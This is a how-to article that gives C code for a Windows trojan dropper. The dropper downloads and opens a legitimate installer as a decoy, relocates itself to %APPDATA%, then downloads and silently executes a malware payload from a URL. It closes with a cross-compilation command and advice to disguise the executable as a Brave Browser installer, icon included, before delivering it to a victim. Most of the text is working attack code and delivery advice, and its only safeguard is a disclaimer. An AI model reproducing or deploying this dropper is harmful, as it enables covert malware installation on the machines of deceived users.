# Creating a Trojan

## DISCLAIMER: This project was made for research purposes. Anything you do with this code is on you and is not my responsibility.

The main basis of this article will be to bundle a legitimate application with a malicious one. Here are the steps we will go through:
1. Code a dropper that will drop both the legitimate application & the malicious one. 
2. The dropper will then copy itself to another directory to hide it & then the dropped malicious application will overwrite & delete the dropper.

Let's start with defining the needed parameters for this function:

* legitimate_app  -> this is our legitimate application's file name to drop on the victim's machine
* legitimate_app_URL -> this is our legitimate application's URL to download it from
* malware_URL -> this is our malicious application's URL to download it from
* malware_app -> this is our malicious application's file name to drop on the victim's machine
* dropper_new_name -> this is the new name of our dropper. At first, our dropper will be masked to look like the legitimate application, but when it's executed, it will download the legitimate application & replace the dropper. This means we will have to move our dropper to a new location and give it a new name


Now, let's defining some variables we will be using when downloading & grabbing the legitimate application:

`
TCHAR current_dir[MAX_PATH]
TCHAR current_file[MAX_PATH]
TCHAR new_dir[MAX_PATH]
`
* current_dir will be used to grab the current directory & append the legitimate_app string to the end of it to build the location to drop the legitimate piece of software.
* current_file will store the current directory & name of the dropper. This will be the first parameter of the **MoveFileA** function
* new_dir will be used to build the location where the dropper will be moved to. This will be the 2nd parameter of the **MoveFileA** function

`
GetCurrentDirectory(MAX_PATH, current_dir);
strcat_s(current_dir, strlen(current_dir)+strlen(legitimate_app)+1, legitimate_app);

GetModuleFileNameA(NULL, current_file, MAX_PATH);
GetEnvironmentVariable("APPDATA", new_dir, MAX_PATH);
strcat_s(new_dir, strlen(new_dir)+strlen(dropper_new_name)+1,dropper_new_name);
int mresult = MoveFileA(current_file, new_dir);
`

1. This will store the current directory in current_dir 
2. This will concatenate the legitimate_app variable (the legitimate application's filename) to the current_dir variable
3. This will get the full path of the current running process & store it in current_file
4. This will grab the path of the environment variable "APPDATA" & store it in new_dir
5. the dropper's new file name is then concatenated to the new_dir variable
6. Then we move the dropper to the new directory which is %APPDATA% & rename it to whatever dropper_new_name is set to

`
HRESULT filedl = URLDownloadToFile(NULL, legitimate_app_URL, current_dir, 0, NULL);
if (filedl == S_OK) {
    HINSTANCE result = ShellExecuteA(NULL, "open", current_dir, NULL, NULL, 0);
}
else {
		printf("[!] Error with download\n");
}
`

Here we are simply downloading the legitimate application from the legitimate_app_URL variable & saving it to wherever current_dir points to. If the download is successful, we execute the legitimate software.

Now onto the next part of the code, downloading the malware & executing it.

The only variable we define here is:
`TCHAR maldir[MAX_PATH];`
which will be used to store the full directory of the malware being dropped.

`
GetEnvironmentVariable("APPDATA", maldir, MAX_PATH);
strcat_s(maldir, strlen(maldir)+strlen(malware_app)+1, malware_app);
`
1. Grabbing environment variable of APPDATA & storing it in maldir
2. Appending the desired file name of the malware that gets dropped to the maldir variable, creating a full path

`
HRESULT maldl = URLDownloadToFile(NULL, malware_URL, maldir, 0, NULL);
if (maldl == S_OK) {
    printf("[+] Successfully downloaded main malware\n");
    HINSTANCE result2 = ShellExecuteA(NULL, "open", maldir, NULL, NULL, 0);
    exit(0);
}
else {
    printf("[!] Error downloading main malware\n");
}
`
This is a repeat of earlier code, we're simply downloading the malware from the URL stored in malware_URL & saving it to the path stored in maldir. If the download succeeds, we execute it & then exit the dropper.

## Cross-Compilation
    `x86_64-w64-mingw32-gcc input.c -o output.exe -lurlmon`

Before delivering your dropper to your victim, be sure to rename it to the legitimate application's name. For example, if you were to have it masquerade as a Brave Browser installer, name the dropper file BraveBrowserSetUp.exe & change the icon of it to match the original.
